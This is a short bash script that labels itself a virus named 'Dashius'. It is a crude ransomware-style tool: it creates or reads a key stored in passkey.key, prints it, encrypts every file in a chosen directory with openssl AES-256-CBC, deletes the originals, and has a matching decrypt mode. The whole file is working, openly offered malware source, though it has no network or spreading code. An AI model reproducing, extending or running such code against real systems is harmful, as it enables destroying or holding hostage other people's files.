#!/bin/bash
clear
# the main virus script
Version="1.0"

# virus name
Name="Dashius"

# virus description
Description="This is a virus created by Dashtiss"

# virus author
Author="Dashtiss"

# will print all the info in color
echo "Virus name: $Name"
echo "Virus description: $Description"
echo "Virus author: $Author"
echo "Virus version: $Version"

# virus main code

if [[ -f "passkey.key" ]]; then
    Passkey=$(cat passkey.key)
else
    # will generate a passkey
    Passkey=$(openssl rand -hex 32)
    echo "$Passkey" > passkey.key
fi

echo "Passkey: $Passkey"
function ecrypt() {
    # path of the directory to be encrypted
    path="$1"
    # will encrypt the files
    echo "Encrypting the files"

    for file in "$path"/*; do
        if [ -f "$file" ]; then
            if ! [[ $file == *.enc ]]; then
                echo "Encrypting $file"
                openssl enc -e -pbkdf2 -k "$Passkey" -aes-256-cbc -in "$file" -out "$file".enc 
                rm "$file"
            fi
        fi
    done
}

function decrypt() {
    path="$1"
    # will decrypt the files
    echo "Decrypting the files"
    for file in "$path"/*.enc; do
        if [ -f "$file" ]; then
            # will check if the file ends with .enc
            if [[ $file == *.enc ]]; then
                filename=$(basename "${file%.*}")
                PathToFile=$(dirname "$file")
                openssl enc -d -pbkdf2 -k "$Passkey" -aes-256-cbc -in "$file" -out "$PathToFile/$filename"
                # will remove the .enc from the file name
                
                
                echo "File decrypted: $filename"

                rm "$file"
            fi
        fi
    done
}


if [[ $1 == "-e" ]]; then
    ecrypt "$2"
elif [[ $1 == "-d" ]]; then
    decrypt "$2"
else
    # will print the usage in green
    # shellcheck disable=SC2028
    echo "\033[0;32mUsage: $0 -e <path> -d <path>"
    echo "Options:"
    echo "-e: Encrypt files"
    echo "-d: Decrypt files"
    echo "Example: $0 -e /path/to/encrypt"
    echo "Example: $0 -d /path/to/decrypt"
    echo "\033[0m"
fi